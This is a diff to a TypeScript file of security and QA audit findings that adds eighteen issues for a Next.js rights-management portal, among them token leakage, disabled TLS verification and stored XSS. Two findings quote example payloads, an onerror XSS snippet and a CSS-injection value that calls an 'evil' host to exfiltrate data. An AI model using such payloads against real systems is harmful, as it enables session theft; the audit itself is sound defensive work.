@@ -6,7 +6,7 @@
 // ============================================================
 
 export type QASeverity = 'critical' | 'high' | 'medium' | 'low' | 'info';
-export type QAProduct = 'MSIT' | 'IMT';
+export type QAProduct = 'MSIT' | 'IMT' | 'DRM';
 
 export interface QAFinding {
   id: string;
@@ -37,7 +37,7 @@ export const qaAuditMeta = {
   auditedOn: '2026-07-07',
   org: 'OxygeneTech',
   method: 'Local-only static analysis + dynamic reproduction. No commits, no production access.',
-  totalRepos: 6,
+  totalRepos: 7,
 };
 
 export const qaServiceSummaries: QAServiceSummary[] = [
@@ -47,6 +47,7 @@ export const qaServiceSummaries: QAServiceSummary[] = [
   { repo: 'o2-msit-schenduler', product: 'MSIT', stack: 'Python + Apache Airflow', branchesAudited: 'main, staging', testRun: 'All 3 DAGs parse; ruff check clean; ruff format --check FAILS; no tests dir (pytest fails CI).' },
   { repo: 'o2-influencer-marketing-gateway-api', product: 'IMT', stack: 'Python / FastAPI + Alembic', branchesAudited: 'main, staging', testRun: '200 passed, 3 failed, 2 errored. App imports OK. Single clean Alembic head. 4 bugs reproduced live.' },
   { repo: 'o2-influencer-marketing-web-portal', product: 'IMT', stack: 'Next.js 16 + TS', branchesAudited: 'main, staging, + 3 feature branches', testRun: 'Default build FAILS (Turbopack); install FAILS on fresh clone; 10/44 suites red; webpack build OK.' },
+  { repo: 'drm', product: 'DRM', stack: 'Next.js 15 + React 19 + NextAuth v4', branchesAudited: 'master (+ 13 branches)', testRun: 'Install OK; tsc 41 errors (masked by ignoreBuildErrors); build compiles; live load test ~65 req/s (p99 1.3s); pnpm audit 78 vulns (4 critical). No tests in repo.' },
 ];
 
 export const qaFindings: QAFinding[] = [
@@ -882,5 +883,171 @@ export const qaFindings: QAFinding[] = [
     expected: 'Clean lint; address the React Compiler bailout to avoid stale UI.',
     location: 'components/discovery/(creator)/creator-form.tsx:451 (+ others per eslint output)',
     author: 'Peter Njuguna (xcixor)',
+  },
+
+  // ==========================================================
+  // DRM — drm (Next.js 15 asset/rights-management portal)
+  // ==========================================================
+  {
+    id: 'DRM-01', product: 'DRM', repo: 'drm', branch: 'master', severity: 'critical',
+    title: 'HttpOnly access-token JWT is leaked to the browser (and into a WebSocket URL)',
+    issue: 'Auth tokens are deliberately stored as HttpOnly cookies "not exposed to client" (per comments in userLogin.ts, options.ts, fetchWithAuth.ts). But the root server layout reads that cookie and hands it to a client component as a prop. Repro: log in, then document.cookie won\'t show access_token (good) — but the View Source / RSC payload on any page contains the raw JWT, and the notifications WebSocket is opened as .../ws/notifications/{userId}?token=<JWT>. Any XSS (see DRM-03), browser extension, shared log, or proxy access log now yields a valid bearer token.',
+    actual: 'The JWT is serialized into the client HTML/RSC payload (token={accessToken}) and appended in cleartext to the WebSocket query string (?token=), fully defeating the HttpOnly design.',
+    expected: 'The token must never leave the server. Authenticate the WS via an HttpOnly cookie or a short-lived, single-purpose ticket minted server-side — never a prop or query string.',
+    location: 'app/layout.tsx:46 (reads cookie), app/layout.tsx:80 (token={accessToken} to <NotificationProvider>); consumed at providers/notifications-provider.tsx:108',
+    author: 'Praise Odhiambo',
+  },
+  {
+    id: 'DRM-02', product: 'DRM', repo: 'drm', branch: 'master', severity: 'critical',
+    title: 'TLS certificate verification disabled in production (NODE_TLS_REJECT_UNAUTHORIZED=0)',
+    issue: 'The env schema defaults this flag to "0", the env-file generator writes it, and the production deploy workflow hard-codes V_TLS_REJECT: "0" → injects NODE_TLS_REJECT_UNAUTHORIZED=0 into the running container. With this set, Node\'s global HTTPS agent (used by axios/fetch in every server action to helix-service, and by the file-proxy fetch) accepts ANY certificate.',
+    actual: 'All server-to-backend traffic — including credential login, refresh tokens, and forwarded session cookies — is vulnerable to trivial MITM/interception; a self-signed or attacker cert is accepted silently.',
+    expected: 'Verify TLS. Install a proper CA/Let\'s Encrypt cert on internal services (the code comments even admit it is a "self-signed cert workaround"). Never ship NODE_TLS_REJECT_UNAUTHORIZED=0 to production.',
+    location: 'lib/env.ts:24 (.default("0")); scripts/create_env_file.sh:10; .github/workflows/deploy.yml:295,310,398,432',
+    author: 'Praise Odhiambo',
+  },
+  {
+    id: 'DRM-03', product: 'DRM', repo: 'drm', branch: 'master', severity: 'high',
+    title: 'Stored XSS via unsanitized DOCX preview HTML',
+    issue: 'DocxPreviewer fetches a .docx, runs mammoth.convertToHtml, and injects the result via dangerouslySetInnerHTML with no sanitization. mammoth faithfully carries through image/anchor markup, so a crafted .docx yielding e.g. <img src=x onerror=...> executes in the victim\'s session. The site CSP permits it because script-src includes unsafe-inline (DRM-07). Repro: upload a malicious .docx as an asset/MRF, open its preview as another user.',
+    actual: 'Attacker-controlled HTML from an uploaded document is rendered as live DOM → script execution → session/token theft (amplified by DRM-01).',
+    expected: 'Sanitize mammoth output with DOMPurify (or render in a sandboxed iframe) before injecting.',
+    location: 'components/shared/docx-preview.tsx:28 (convert), :50 (dangerouslySetInnerHTML)',
+    author: 'Praise Odhiambo',
+  },
+  {
+    id: 'DRM-04', product: 'DRM', repo: 'drm', branch: 'master', severity: 'high',
+    title: 'Vulnerable xlsx@0.18.5 parsing untrusted spreadsheets on the browser main thread',
+    issue: 'folder-drop.tsx reads a user-provided Excel file and calls XLSX.read(...) / sheet_to_json(...) synchronously inside FileReader.onload. xlsx@0.18.5 has Prototype Pollution (CVE-2023-30533) and ReDoS (CVE-2024-22363) with no fixed version on npm. Repro: drop a crafted .xlsx into the campaign folder-upload flow.',
+    actual: 'Prototype pollution / ReDoS from untrusted input; large files also block the UI thread (no worker).',
+    expected: 'Migrate off the npm xlsx (use the vendor CDN build >=0.20.2 or a maintained alternative like exceljs), and parse in a Web Worker.',
+    location: 'components/campaign/folder-drop.tsx:158,163,173; dependency package.json:85',
+    author: 'Praise Odhiambo',
+  },
+  {
+    id: 'DRM-05', product: 'DRM', repo: 'drm', branch: 'master', severity: 'high',
+    title: 'Production build masks 41 TypeScript errors (and all lint)',
+    issue: 'next.config.ts sets typescript.ignoreBuildErrors: true and eslint.ignoreDuringBuilds: true. Running pnpm exec tsc --noEmit yields 41 errors across 41 locations, including auth-shaped ones: session.strategy: "jwt" is not typed as SessionStrategy (options is not annotated AuthOptions), and User.organization_id / company_id do not exist on the session User type (missing NextAuth module augmentation) — so those values are read as any/undefined at runtime.',
+    actual: 'The build "passes" (Compiled successfully) while shipping code with real type errors; type safety on the auth/session surface is effectively off.',
+    expected: 'Fix the type errors and remove the ignore flags (at minimum keep tsc --noEmit gating CI). Add NextAuth next-auth.d.ts module augmentation for the custom User/session fields.',
+    location: 'next.config.ts:20-25; representative errors: app/api/auth/[...nextauth]/route.ts:4, lib/auth/server.ts:8,13,19, app/(dashboard)/dashboard/campaigns/page.tsx:7',
+    author: 'Praise Odhiambo',
+  },
+  {
+    id: 'DRM-06', product: 'DRM', repo: 'drm', branch: 'master', severity: 'high',
+    title: '78 dependency vulnerabilities (4 critical / 35 high) via pnpm audit',
+    issue: 'pnpm audit → 78 vulnerabilities (7 low | 32 moderate | 35 high | 4 critical). Notable: axios <1.15.1 (SSRF + credential leak; direct dep at ^1.9.0), next 15.5.15 (multiple advisories incl. content-injection/cache; fixed in >=15.5.16), xlsx (DRM-04), form-data <4.0.4 (unsafe boundary, critical), pbkdf2 / sha.js (critical, via crypto-browserify polyfill chain), tar / tar-fs, serialize-javascript, preact.',
+    actual: 'Shipping known-exploitable transitive and direct packages.',
+    expected: 'Bump axios to >=1.15.1, next to >=15.5.16, address the crypto-browserify polyfill chain, and re-audit. Track a remediation list for the criticals.',
+    location: 'package.json (axios, next, xlsx); full output from pnpm audit',
+    author: 'Praise Odhiambo / Daniel Mutua (dependency hygiene)',
+  },
+  {
+    id: 'DRM-07', product: 'DRM', repo: 'drm', branch: 'master', severity: 'medium',
+    title: 'Content-Security-Policy weakened by unsafe-inline scripts',
+    issue: 'The CSP sets script-src \'self\' \'unsafe-inline\' (and style-src \'unsafe-inline\'). unsafe-inline in script-src permits inline scripts and inline event handlers, which is exactly what makes DRM-03/DRM-08 exploitable.',
+    actual: 'The CSP provides little XSS protection for scripts.',
+    expected: 'Use nonces/hashes for Next.js hydration scripts and drop unsafe-inline from script-src.',
+    location: 'middleware.ts:31',
+    author: 'Praise Odhiambo',
+  },
+  {
+    id: 'DRM-08', product: 'DRM', repo: 'drm', branch: 'master', severity: 'medium',
+    title: 'dangerouslyAllowSVG: true enables SVG-based XSS through next/image',
+    issue: 'next.config.ts enables dangerouslyAllowSVG while img-src allows data:/blob: and several remote hosts. SVGs served/optimized this way can carry embedded scripts.',
+    actual: 'An SVG asset can execute script when rendered.',
+    expected: 'Keep dangerouslyAllowSVG: false, or serve SVGs with Content-Security-Policy: sandbox and Content-Disposition: attachment and never inline them.',
+    location: 'next.config.ts:85',
+    author: 'Praise Odhiambo',
+  },
+  {
+    id: 'DRM-09', product: 'DRM', repo: 'drm', branch: 'master', severity: 'medium',
+    title: 'Passwords and refresh tokens transmitted as URL query parameters',
+    issue: 'helixUpdatePassword sends params: { email, new_password } and helixRefreshToken sends the refresh token as params: { refresh_token } — i.e. secrets end up in the request URL/query string.',
+    actual: 'Secrets are exposed in server/proxy access logs, browser history (where applicable), and referrer chains.',
+    expected: 'Send passwords/tokens only in the request body (POST) or headers, never the query string.',
+    location: 'lib/actions/helix-service.ts:394-398 (helixUpdatePassword), :326-330 (helixRefreshToken)',
+    author: 'Praise Odhiambo',
+  },
+  {
+    id: 'DRM-10', product: 'DRM', repo: 'drm', branch: 'master', severity: 'medium',
+    title: 'CSS injection via unvalidated organization theme values',
+    issue: 'buildThemeCSS concatenates org theme_config values (primary, accent, sidebar, radius) directly into a <style> block injected via dangerouslySetInnerHTML in the root layout, with no validation that they are valid colors/lengths. An org admin can set radius to "0} body{background:url(https://evil/?x)}" to inject arbitrary CSS rules affecting all users of the org.',
+    actual: 'Arbitrary CSS injection (defacement, CSS-based data exfiltration).',
+    expected: 'Validate each value against a strict hex/length regex (or reject on the backend) before emitting.',
+    location: 'lib/utils/theme.ts:35-78; injected at app/layout.tsx:64',
+    author: 'Praise Odhiambo',
+  },
+  {
+    id: 'DRM-11', product: 'DRM', repo: 'drm', branch: 'master', severity: 'medium',
+    title: 'Broken mutation states — TanStack Query v5 isLoading used instead of isPending',
+    issue: 'React Query v5 removed isLoading from UseMutationResult (it is now isPending). The code reads mutation.isLoading in many places, so it is always undefined. Confirmed by the typecheck (Property isLoading does not exist on type UseMutationResult...).',
+    actual: 'Submit buttons never show a loading/disabled state during mutations, enabling double-submits (duplicate creates/deletes).',
+    expected: 'Replace mutation isLoading with isPending.',
+    location: 'hooks/use-assets.ts:137; settings/departments/client-page.tsx:250,253,444,453; settings/employees/client-page.tsx:358,361,543,674,677',
+    author: 'Praise Odhiambo',
+  },
+  {
+    id: 'DRM-12', product: 'DRM', repo: 'drm', branch: 'master', severity: 'medium',
+    title: 'Organization assets fetch is hard-capped at 500 with no pagination',
+    issue: 'getOrganizationAssets requests ?skip=0&limit=500 with a fixed offset and never paginates.',
+    actual: 'Organizations with >500 assets silently lose everything past the 500th; also a single large payload rather than paged loads.',
+    expected: 'Implement real pagination (or infinite query) and surface total counts.',
+    location: 'lib/actions/asset-actions.ts:147',
+    author: 'Praise Odhiambo',
+  },
+  {
+    id: 'DRM-13', product: 'DRM', repo: 'drm', branch: 'master', severity: 'medium',
+    title: 'Unauthenticated public image/PDF proxy routes',
+    issue: 'middleware.ts matcher only covers /, /dashboard/*, /landing/*. The API routes /api/proxy-image and /api/proxy-pdf are therefore reachable without a session. SSRF is largely mitigated by hostname allowlists + a private-IP regex, but the endpoints remain an open fetch relay, and proxy-image (unlike proxy-pdf) has no fetch timeout.',
+    actual: 'Anyone can drive server-side fetches to allowlisted hosts; proxy-image can hang on a slow upstream.',
+    expected: 'Require auth on these routes (or add them to the matcher), add an AbortController timeout to proxy-image, and resolve/validate the target IP (not just hostname) to harden against DNS-rebinding.',
+    location: 'middleware.ts:75-80; app/api/proxy-image/route.ts:41; app/api/proxy-pdf/route.ts:42',
+    author: 'Praise Odhiambo',
+  },
+  {
+    id: 'DRM-14', product: 'DRM', repo: 'drm', branch: 'master', severity: 'medium',
+    title: 'Sentry configured for 100% tracing + session replay + logs in production',
+    issue: 'Both client and server Sentry configs set tracesSampleRate: 1, enableLogs: true, and the client adds replayIntegration() with replaysSessionSampleRate: 0.1 / replaysOnErrorSampleRate: 1.0.',
+    actual: '100% trace sampling and session replay in production drive high Sentry cost, added latency, and PII exposure risk via replay (only partially offset by beforeSend stripping user fields). The DSN is also hardcoded in source (acceptable for a browser DSN, but should be env-driven).',
+    expected: 'Lower tracesSampleRate in production (e.g. 0.1), gate replay, and source the DSN from env.',
+    location: 'sentry.server.config.ts:11; instrumentation-client.ts:8,14,21',
+    author: 'Praise Odhiambo',
+  },
+  {
+    id: 'DRM-15', product: 'DRM', repo: 'drm', branch: 'master', severity: 'medium',
+    title: 'Login/root page is fully dynamic (SSR per request) → low throughput',
+    issue: 'The root layout calls cookies()/getAuthUser() unconditionally, so even the public login page (/) is rendered dynamically on every request with no caching. Load test (autocannon -c 50 -d 20 http://localhost:3000/): 1300 reqs, 0 errors, ~65 req/s, latency avg 761 ms, p50 666 ms, p90 1118 ms, p99 1300 ms.',
+    actual: 'The unauthenticated landing/login page cannot be statically served or CDN-cached; ~65 rps/instance with sub-second-but-high latency under modest concurrency.',
+    expected: 'Split auth-dependent work out of the shared root layout so the public login route can be static/streamed; only do the cookie/theme fetch on authenticated segments.',
+    location: 'app/layout.tsx:44-58',
+    author: 'Praise Odhiambo',
+  },
+  {
+    id: 'DRM-16', product: 'DRM', repo: 'drm', branch: 'master', severity: 'low',
+    title: 'Dead stub hooks report fake success',
+    issue: 'useUpdateAsset and useCreateAsset have mutationFn bodies that just return Promise.resolve({ success: true }) (real calls commented out). They are currently unused, but any future wiring will silently "succeed" without touching the API.',
+    actual: 'A latent trap — mutations that no-op while signaling success.',
+    expected: 'Implement or delete these hooks.',
+    location: 'hooks/use-assets.ts:59-62, :186-189',
+    author: 'Praise Odhiambo',
+  },
+  {
+    id: 'DRM-17', product: 'DRM', repo: 'drm', branch: 'master', severity: 'low',
+    title: 'JSON.stringify(FormData) produces "{}" in registration actions',
+    issue: 'registerUser, registerOrganization, and registerDepartment take a FormData and send JSON.stringify(formData) as the body. JSON.stringify of a FormData instance is always "{}". These actions appear unused today, but the code is incorrect.',
+    actual: 'If invoked, the backend receives an empty JSON object instead of the form fields.',
+    expected: 'Convert to a plain object (Object.fromEntries(formData)) or send the FormData directly.',
+    location: 'lib/actions/api.ts:20,45,62',
+    author: 'Praise Odhiambo',
+  },
+  {
+    id: 'DRM-18', product: 'DRM', repo: 'drm', branch: 'master', severity: 'low',
+    title: 'Spoofable client IP forwarded + noisy production logging + no tests',
+    issue: 'fetchWithAuth forwards the inbound x-forwarded-for header verbatim as X-Forwarded-For to helix (:45), so a client-supplied header is trusted for any downstream logging/rate-limiting. Separately, there are ~41 console.log/console.error calls in app code that dump full query results/asset data (e.g. hooks/use-assets.ts:217, lib/actions/api.ts:659,675). And the repo contains zero unit/e2e tests.',
+    actual: 'IP-based logging/limits can be spoofed; verbose logs risk leaking data (incl. signed URLs) to server logs; no automated regression safety net.',
+    expected: 'Derive client IP from the trusted proxy only; strip debug logging in production (or use the Sentry logger with redaction); add a minimal test suite.',
+    location: 'lib/auth/fetchWithAuth.ts:45; assorted console.* (e.g. hooks/use-assets.ts:217); no test files tracked',
+    author: 'Praise Odhiambo',
   },
 ];
